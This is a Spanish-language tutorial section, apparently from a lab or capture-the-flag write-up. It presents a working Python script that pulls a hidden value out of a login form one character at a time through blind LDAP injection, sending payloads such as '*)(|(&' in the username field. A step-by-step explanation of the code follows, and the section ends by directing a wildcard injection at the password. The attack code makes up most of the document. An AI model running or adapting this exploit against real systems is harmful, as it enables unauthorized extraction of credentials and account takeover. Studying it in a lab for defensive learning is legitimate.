<h2>Exploit Code</h2>
Para automatizar la exfiltración de infrmación de la tarea anterior puedes usar el código de Python siguiente:

```python
import requests
from bs4 import BeautifulSoup
import string
import time

# Base URL
url = 'TARGET_URL' #¡¡¡SUSTITUIR!!!

# Define the character set
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

# Initialize variables
successful_response_found = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        #print(f"Trying password character: {char}")

        # Adjust data to target the password field
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}

        # Send POST request with headers
        response = requests.post(url, data=data, headers=headers)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Adjust success criteria as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")
```

<h4>Desglose del Código</h4>
1. **Imports:** 
	- `requests`: Librería de Python para hacer peticiones HTTP.
	- `BeautifulSoup` from `bs4`: Una librería para parsear documentos HTML, haciendo más fácil navegar y buscar el árbol parseado.
	- `string`: Módulo que coniene operaciones de string comunes incluyendo una coleccón de constantes de strings.
	- `time`: Un módulo que ofrece varias funciones relacionadas con el tiempo.
2. **Setup:** 
	- La variable `url` está configurada en `TARGET_URL` y hay que sustituírla por la URL objetivo donde se mandarán las peticiones POST.
	- `char_set` incluye letras minúsculas y mayúsculas, números y un conjunto de caractees especiales.
3. **Inicialización de Variables:** 
	- `successful_response_found`: Es una flag usada para controlar el bucle while. Comienza como `True` para entrar al loop y lo configura a `False` cuando no encuentra un caracter.
	- `successful_chars`: Guarda la secuencia de los caracteres correctamente adivinados.
4. **Headers HTTP:** 
	- Se define un diccionario `headers` con el content type configurado en `'application/x-www-form-urlencoded'`, indicando el formato del cuerpo de la petición HTTP POST.
5. **Bucle  Principal:** 
	- El script entra en un bucle `while` que continúa tanto como `successful_response_found` sea `True`.
	- Dentro de este loop, itera cada caracter en `char_set`.
6. **Construir y Mandar Peticiones HTTP:** 
	- Para cada caracter el script crea un diccionario `data` con un par de clave-valor para la petición HTTP POST. El campo `username` es inyectado con un payload combinando caracteres encontrados y el caracter en comprobación actualmente, seguido de `*)(|(&` que es parte de la sintaxis de inyección. El campo de contraseña es configurado en `pwd)`.
	- Se manda una petición HTTP POST a la `url` objetivo con la `data` y `headers` construídos.
7. **Manejo de Respuestas:** 
	- El contenido de la respuesta es parseado con BeautifulSoup para analizar la estructura HTML.
	- El script busca etiquetas `<p>` con el atributo `style` configurado como `'color: green;'`, que es una adivinación exitosa.
8. **Verificación de Caracteres:** 
	- Si se encuentran dichos párrafos, quiere decir que el caracter actual es parte de la contraseña. Este caracter es añadido a `successful_chars` y el script sale del bucle interno para volver a empezar.
	- Si no se encuentran párrafos que coincidan con el criterio, el script concluye que no ha habido hallazgos y sale del bucle principal.
9. **Output:** 
	- Una vez que todos los caracteres se han probado o se encuentra la sentencia correcta, el script imprime la secuencia final de caracteres encontrados.

El script adivina de forma iterativa los caracteres del email observando el comportamiento de la página. Cuando consigas el email haz una wildcard injection en la contraseña.
